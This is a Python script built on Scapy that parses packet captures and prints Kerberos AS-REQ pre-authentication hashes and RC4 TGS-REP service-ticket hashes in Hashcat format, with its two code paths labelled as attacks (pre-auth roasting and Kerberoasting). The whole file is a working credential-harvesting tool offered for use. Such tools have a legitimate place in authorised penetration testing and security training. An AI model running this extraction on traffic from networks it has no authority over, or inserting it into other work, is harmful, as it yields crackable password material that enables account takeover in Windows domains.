#!/usr/bin/python3
import argparse
import sys
import logging
# Suppress Scapy warning messages for a cleaner console
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from binascii import hexlify

def parse_args():
    parser = argparse.ArgumentParser(
        description="Extract Kerberos hashes (AS-REQ & TGS-REP) from PCAP files for Hashcat.",
        epilog="Supported Hash Types:\n"
               "  - AS-REQ (Pre-Auth Roasting): RC4 (Mode 7500), AES-128 (Mode 19800), AES-256 (Mode 19900)\n"
               "  - TGS-REP (Kerberoasting):    RC4 (Mode 13100)",
        formatter_class=argparse.RawTextHelpFormatter,
        usage="%(prog)s [options] <pcap_file>"
    )
    parser.add_argument("pcap_file", help="Path to the .pcap capture file")
    return parser.parse_args()

def get_msg_type(packet):
    """Helper to detect Kerberos Message Type"""
    try:
        if packet.haslayer(KRB_AS_REQ):
            return 10 # AS-REQ
        elif packet.haslayer(KRB_TGS_REP):
            return 13 # TGS-REP
    except:
        pass
    return None

def parse_packet(packet):
    try:
        if not packet.haslayer(Kerberos):
            return None, None

        msg_type = get_msg_type(packet)
        if not msg_type:
            return None, None

        # ==========================================
        # ATTACK 1: AS-REQ (Pre-Auth Roasting)
        # ==========================================
        if msg_type == 10: 
            data = packet[Kerberos]
            if not (data.haslayer(PADATA) and data[PADATA].padataValue.cipher):
                return None, None

            # Detect Encryption Type
            enctype_byte = bytes(data[EncryptedData].etype)[-1:].decode()
            encryption_type = 18 # Default to AES-256
            
            if enctype_byte == '\x17': encryption_type = 23 # RC4
            elif enctype_byte == '\x11': encryption_type = 17 # AES-128
            elif enctype_byte == '\x12': encryption_type = 18 # AES-256

            # Extract User and Realm
            nameString = bytes(data[KRB_KDC_REQ_BODY][PrincipalName].nameString[0])[2:].decode()
            realm_raw = bytes(data[KRB_KDC_REQ_BODY].realm)
            full_domain = realm_raw[2:].decode()
            
            # Extract Cipher
            cipher = hexlify(bytes(data[PADATA].padataValue.cipher)[2:]).decode()

            # Construct Hash
            hash_str = f"$krb5pa${encryption_type}${nameString}${full_domain}${cipher}"
            return "AS-REQ", hash_str

        # ==========================================
        # ATTACK 2: TGS-REP (Kerberoasting)
        # ==========================================
        elif msg_type == 13: 
            if not packet.haslayer(KRB_TGS_REP):
                return None, None
            
            tgs = packet[Kerberos][KRB_TGS_REP]
            ticket = tgs.ticket
            
            # Kerberoasting typically targets RC4 (Type 23)
            # Checking ticket->encPart->etype
            etype_byte = int(ticket.encPart.etype)
            
            if etype_byte != 23:
                return None, None 

            # Extract Service Principal info
            sname_list = ticket.sname.nameString
            service_user = bytes(sname_list[0])[2:].decode()
            
            spn_parts = [bytes(x)[2:].decode() for x in sname_list]
            spn = "/".join(spn_parts)

            realm_raw = bytes(ticket.realm)
            domain = realm_raw[2:].decode()

            # Extract Cipher
            cipher_raw = bytes(ticket.encPart.cipher)
            cipher_hex = hexlify(cipher_raw).decode()
            
            checksum = cipher_hex[:32]
            enc_data = cipher_hex[32:]

            hash_str = f"$krb5tgs$23$*{service_user}*{domain}*{spn}*${checksum}${enc_data}"
            return "TGS-REP", hash_str

    except Exception:
        return None, None
    
    return None, None

def main():
    args = parse_args()
    
    print(f"[*] Reading capture file: {args.pcap_file}")
    
    try:
        pcap = rdpcap(args.pcap_file)
    except Exception as e:
        print(f"[-] Error: Could not read file. {e}")
        sys.exit(1)

    print("[*] Analyzing traffic for Kerberos authentication material...")
    
    sessions = pcap.sessions()
    hashes_found = set()
    count_asreq = 0
    count_tgs = 0

    for session in sessions:
        for packet in sessions[session]:
            h_type, result = parse_packet(packet)
            
            if result and result not in hashes_found:
                # Add a cleaner log message when a hash is found
                if h_type == "AS-REQ":
                    count_asreq += 1
                elif h_type == "TGS-REP":
                    count_tgs += 1
                
                print(result)
                hashes_found.add(result)

    print("-" * 50)
    print(f"[*] Extraction complete.")
    if len(hashes_found) > 0:
        print(f"[*] Successfully extracted {len(hashes_found)} unique hashes.")
        print(f"    - Pre-Auth Users (AS-REQ): {count_asreq}")
        print(f"    - Service Tickets (TGS-REP): {count_tgs}")
    else:
        print("[-] No extractable hashes identified in this capture.")

if __name__ == "__main__":
    main()
